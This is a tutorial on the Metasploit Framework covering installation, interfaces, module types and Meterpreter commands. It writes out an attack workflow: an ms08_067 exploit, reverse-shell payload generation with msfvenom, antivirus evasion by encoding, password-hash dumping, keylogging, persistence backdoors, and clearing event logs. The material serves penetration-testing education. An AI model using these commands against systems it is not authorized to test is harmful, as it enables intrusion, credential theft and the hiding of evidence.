# 1. Introduction
The Metasploit Framework is a vital tool in cybersecurity, used for penetration testing and vulnerability assessment. Developed by H.D. Moore in 2003 and now maintained by Rapid7, it has evolved from simple scripts into a comprehensive platform essential for security professionals. Metasploit helps identify and remediate security weaknesses by simulating real-world attacks, allowing organizations to enhance their defenses. Its vibrant community continuously updates the framework to address the latest security challenges. Extensively used in academic settings, Metasploit provides hands-on experience in security testing, making it an invaluable educational resource. Governed by strict ethical guidelines, Metasploit must be used only for authorized security assessments to ensure legal compliance and maintain the integrity of security practices. Thus, the Metasploit Framework stands as a cornerstone of modern cybersecurity, crucial for both current and future security professionals.

# 2. Installation

### Unix / macOS:

#### Automatic Installation (Linux / macOS):
To automatically install Metasploit on Linux or macOS systems, use the following script invocation:
- Run the command:
  ```bash
  curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
  ```
  Once installed, you can launch msfconsole as /opt/metasploit-framework/bin/msfconsole from a terminal window, or depending on your environment, it may already be in your path and you can just run it directly. On the first run, a series of prompts will help you set up a database and add Metasploit to your local PATH if it is not already.

#### Manual Installation for Linux:
- Linux packages are built nightly for .deb (i386, amd64, armhf, arm64) and .rpm (64-bit x86) systems. Debian/Ubuntu packages are available at https://apt.metasploit.com and CentOS/Redhat/Fedora packages are located at https://rpm.metasploit.com.

#### Manual Installation for macOS:
- The latest macOS installer package can be downloaded directly here: https://osx.metasploit.com/metasploitframework-latest.pkg, with the last 8 builds archived at https://osx.metasploit.com/. Simply download and launch the installer to install Metasploit Framework with all of its dependencies.

### Windows:

#### Manual Installation:
- Download the latest Windows installer or view older builds here: https://windows.metasploit.com/. To install, download the .msi package, adjust your Antivirus as-needed to ignore c:\metasploit-framework, and execute the installer by right-clicking the installer file and selecting “Run as Administrator”. The msfconsole command and all related tools will be added to the system %PATH% environment variable.

#### Silent Installation (PowerShell):
The following PowerShell script will download and install the framework, suitable for automated Windows deployments:

```powershell
[CmdletBinding()]
Param(
    $DownloadURL = "https://windows.metasploit.com/metasploitframework-latest.msi",
    $DownloadLocation = "$env:APPDATA/Metasploit",
    $InstallLocation = "C:\Tools",
    $LogLocation = "$DownloadLocation/install.log"
)

If(! (Test-Path $DownloadLocation) ){
    New-Item -Path $DownloadLocation -ItemType Directory
}

If(! (Test-Path $InstallLocation) ){
    New-Item -Path $InstallLocation -ItemType Directory
}

$Installer = "$DownloadLocation/metasploit.msi"

Invoke-WebRequest -UseBasicParsing -Uri $DownloadURL -OutFile $Installer

& $Installer /q /log $LogLocation INSTALLLOCATION="$InstallLocation"
```
### Supported Operating Systems & Requirements:

- **Unix-based systems (Linux, macOS)**
  - **Operating System:** 
    - Linux distributions (e.g., Debian, Ubuntu, CentOS, Red Hat) or macOS.
  - **Processor:** 
    - x86 or x86_64 compatible processor.
  - **Memory:** 
    - At least 1 GB RAM.
  - **Storage:** 
    - Minimum of 200 MB disk space for installation.
  - **Additional Requirements:** 
    - Internet access for automatic updates and package downloads.

- **Windows (7, 8, 10, and newer)**
  - **Operating System:** 
    - Windows 7, 8, 10, or newer.
  - **Processor:** 
    - Intel Pentium 4 processor or later that's SSE2 capable.
  - **Memory:** 
    - At least 1 GB RAM.
  - **Storage:** 
    - Minimum of 1 GB disk space for installation.
  - **Additional Requirements:** 
    - Internet access for automatic updates and package downloads. Windows Installer 3.1 or later.
### Installing Updates:
- Unix Systems:
  ```bash
  sudo apt-get update
  sudo apt-get upgrade metasploit-framework
  ```
- Windows Systems:
  - Open command prompt in Metasploit installation directory.
  - Run: `msfupdate`
 
# 3. Interfaces:

Metasploit provides various interfaces for interacting with its framework, catering to different user preferences and requirements:

- **Console Interface:** 
  The console interface, often referred to as the Metasploit Console or `msfconsole`, is a command-line interface (CLI) that provides comprehensive access to the Metasploit Framework. It allows users to execute various commands, launch exploits, perform post-exploitation tasks, and manage sessions. For example, typing `msfconsole` in the terminal will launch the console interface.

- **GUI Interface:** 
  Metasploit also offers a graphical user interface (GUI) for users who prefer a visual representation of the framework's capabilities. The GUI interface provides a more user-friendly environment for performing tasks such as selecting and launching exploits, analyzing vulnerabilities, and managing workspace projects. For example, **Armitage** is a popular GUI interface for Metasploit.

- **Command Line Interface (CLI):** 
  The command-line interface (CLI) in Metasploit allows users to execute specific commands and scripts without launching the full console environment. While `msfcli` is no longer supported, users can still utilize other command-line tools such as `msfvenom` for generating payloads or `msfconsole` for executing commands and scripts directly from the terminal.

- **Web Interface:** 
  Metasploit includes a web interface that enables users to interact with the framework through a web browser. The web interface provides a user-friendly dashboard for managing exploits, payloads, listeners, and sessions, as well as accessing reporting and collaboration features. It offers a convenient way to perform security assessments and monitor ongoing activities remotely. For example, accessing `https://localhost:3790` in a web browser will open the Metasploit web interface.

# 4. Using the Framework

### 4.1 Choosing a Module
Choosing the appropriate module in Metasploit is the first step in conducting a successful penetration test or vulnerability assessment. Metasploit categorizes its modules into six main types: exploits, auxiliary, payloads, encoders, nops, and post. Each module serves a specific purpose, whether it's exploiting a vulnerability, performing a network scan, delivering a payload, obfuscating code, or generating a NOP sled. Selecting the correct module involves understanding the target system, the vulnerabilities it may have, and the specific outcomes desired from the testing.

### 4.2 Exploit Modules
Exploit modules are the core components of Metasploit, designed to exploit specific vulnerabilities in software and systems. They include a variety of exploits that target different operating systems, applications, and services.

#### 4.2.1 Searching for an Exploit Module
Searching for an appropriate exploit module can be done using the `search` command within the Metasploit console. This helps to identify available exploits for specific vulnerabilities or software versions.

*Example:*

- `search type:exploit name:ms08_067`

#### 4.2.2 Configuring the Active Exploit
Configuring the active exploit involves setting the necessary parameters that the exploit requires to function correctly. This typically includes the target IP address, port number, and any specific options that the exploit might need.

*Example:*

- `use exploit/windows/smb/ms08_067_netapi`
- `set RHOST 192.168.1.100`

#### 4.2.3 Verifying the Exploit Options
Before launching an exploit, it is crucial to verify all configured options to ensure they are correctly set. This step helps in avoiding misconfigurations that could lead to failed exploitation attempts.

*Example:*

- `show options`

#### 4.2.4 Selecting a Target
Some exploits can target multiple versions or configurations of software. Selecting the appropriate target ensures that the exploit is tailored to the specific vulnerability present in the target system.

*Example:*

- `set TARGET 0`

#### 4.2.5 Selecting the Payload
The payload is the code that runs on the target system once the exploit is successful. Metasploit provides a wide range of payloads, from simple command execution to complex Meterpreter sessions. Choosing the right payload depends on the objectives of the penetration test.
*Example:*

- `set PAYLOAD windows/meterpreter/reverse_tcp`
- `set LHOST 192.168.1.101`

#### 4.2.6 Launching the Exploit
Once all configurations are set, launching the exploit initiates the attack. If successful, the payload is delivered, and the tester gains control over the target system or obtains the desired information.

*Example:*

- `exploit`

### 4.3 Auxiliary Modules
Auxiliary modules provide additional functionality beyond exploitation. They include tasks like scanning, fuzzing, and administrative functions.

#### 4.3.1 Searching for an Auxiliary Module
Auxiliary modules can be searched similarly to exploit modules, using keywords related to the desired functionality.

*Example:*

- `search type:auxiliary portscan`

#### 4.3.2 Running an Auxiliary Task
Running an auxiliary task involves selecting and configuring an auxiliary module to perform a specific function. This might include network discovery, vulnerability scanning, or service enumeration.

*Example:*

- `use auxiliary/scanner/portscan/tcp`
- `set RHOSTS 192.168.1.0/24`
- `set THREADS 10`
- `run`

### 4.4 Payload Modules
Payload modules are the code executed on the target system after exploitation. They are a crucial part of the post-exploitation phase, enabling further actions on the compromised system.

#### 4.4.1 Searching for a Payload Module
Payloads can be searched based on the type of shell or function desired.

*Example:*

- `search type:payload windows`

#### 4.4.2 Generating a Payload
Generating a payload involves selecting the appropriate payload type and configuring it to work with the chosen exploit. Metasploit provides tools like `msfvenom` to create and customize payloads for various scenarios.

*Example:*

- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.101 LPORT=4444 -f exe -o /tmp/meterpreter.exe`

### 4.5 Encoder Modules
Encoders are used to obfuscate payloads to evade detection by security mechanisms like antivirus software. They transform the payloads into different formats to avoid signature-based detection.

#### 4.5.1 Searching for an Encoder Module
Encoders can be searched using the `search` command.

*Example:*

- `search type:encoder`

#### 4.5.2 Using an Encoder
Using an encoder involves selecting and configuring the encoder to transform the payload. This process helps in bypassing security controls that detect known payload signatures.

*Example:*

- `use encoder/x86/shikata_ga_nai`
- `set PAYLOAD windows/meterpreter/reverse_tcp`
- `set LHOST 192.168.1.101`
- `generate -f exe -o /tmp/encoded_meterpreter.exe`

### 4.6 NOP Modules
NOP (No Operation) modules are used to generate NOP sleds, sequences of NOP instructions that help align the payload in memory during exploitation. NOP sleds increase the likelihood of successful payload execution in buffer overflow attacks.

#### 4.6.1 Searching for a NOP Module
NOP modules can be searched using the `search` command.

*Example:*

- `search type:nop`

#### 4.6.2 Generating a NOP Sled
Generating a NOP sled is a technique used in buffer overflow exploits to ensure reliable execution of the payload. Metasploit can generate these sleds to prepend to the payload, increasing the chances of successful exploitation.

*Example:*

- `msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 3 -f exe -o /tmp/encoded_meterpreter.exe`

### 4.7 Post Modules
Post-exploitation modules are used after a successful exploit to gather information, maintain access, and pivot to other systems.

#### 4.7.1 Searching for a Post Module
Post modules can be searched using the `search` command.

*Example:*

- `search type:post`

#### 4.7.2 Running a Post Module
Running a post module involves selecting and configuring the module to perform specific post-exploitation tasks, such as

collecting information, dumping credentials, or establishing persistence on the compromised system.

*Example:*

- `use post/windows/gather/enum_logged_on_users`
- `set SESSION 1`
- `run`

# Meterpreter
Meterpreter, an integral component of the Metasploit Framework, serves as a pivotal post-exploitation tool widely utilized by penetration testers and ethical hackers. Its inception within the open-source framework enables security professionals to discover, exploit, and validate vulnerabilities across diverse systems and networks. At its core, Meterpreter facilitates interactive shell sessions on compromised target systems, affording operators comprehensive control over various system facets.

### Key Features and Functionalities:

- **Platform Independence:** Meterpreter boasts platform independence, functioning seamlessly across Windows, Linux, and macOS environments, ensuring compatibility across a spectrum of target systems.
- **Payload Delivery:** Often employed as a payload post-exploit, Meterpreter injects into system memory, evading detection by bypassing disk storage, thus enhancing its stealth capabilities.
- **Remote Shell Access:** Providing an interactive command shell, Meterpreter empowers operators to execute commands on compromised systems remotely, akin to physical presence, facilitated by features like tab completion and command history.
- **File System Manipulation:** Security practitioners leverage Meterpreter to navigate, upload, and download files on target systems, essential for reconnaissance, data exfiltration, and infiltration purposes.
- **Privilege Escalation:** Equipped with built-in post-exploitation modules, Meterpreter facilitates privilege escalation, crucial for transitioning from lower- to higher-privileged user accounts.
- **Port Forwarding:** Meterpreter enables port forwarding, enabling the establishment of secure communication tunnels between attacker and target systems.
- **Keylogging:** Offering keylogging capabilities, Meterpreter captures keystrokes, unveiling potentially sensitive information such as usernames and passwords.
- **Screenshot Capture:** Security professionals utilize Meterpreter to capture screenshots of target system desktops, aiding in the observation of victim activities.
- **Persistence:** Meterpreter establishes persistence on compromised systems, ensuring sustained access even post-system reboots.

### Basic Meterpreter Commands:

- `help`: Lists available Meterpreter commands.
- `sysinfo`: Retrieves system information.
- `pwd`: Displays current working directory.
- `ls` or `dir`: Lists files and directories.
- `cd`: Changes current directory.
- `download`: Downloads files from target to local machine.
- `upload`: Uploads files from local machine to target.
- `shell`: Opens shell session on target.
- `ps`: Lists running processes.
- `kill`: Terminates specified process.
- `getsystem`: Attempts privilege escalation to SYSTEM level (Windows).
- `hashdump`: Dumps password hashes (Windows SAM database).
- `keyscan_start` and `keyscan_dump`: Initiates and dumps keylogging data.
- `screenshot`: Captures target desktop screenshot.

### Advanced Meterpreter Features:

- `migrate`: Moves session to another process for stealth.
- `portfwd`: Sets up port forwarding for traffic pivoting.
- `webcam_list` and `webcam_snap`: Lists and captures webcam images (if available).
- `timestomp`: Manipulates file timestamps for cover-up.
- `clearev`: Clears event logs on target system.

### Persistence and Privilege Escalation:

- `run persistence`: Establishes persistent backdoor for continued access.
- `getuid`: Displays current user's privileges.
- `getprivs`: Shows available privileges.
- `rev2self`: Attempts to revert to original token.
- `use incognito`: Activates incognito mode for token manipulation.

### Cleaning Up:

- `clearev`: Clears event logs on target system.
- `execute -f cmd.exe -i -H`: Spawns new command prompt with high integrity level.
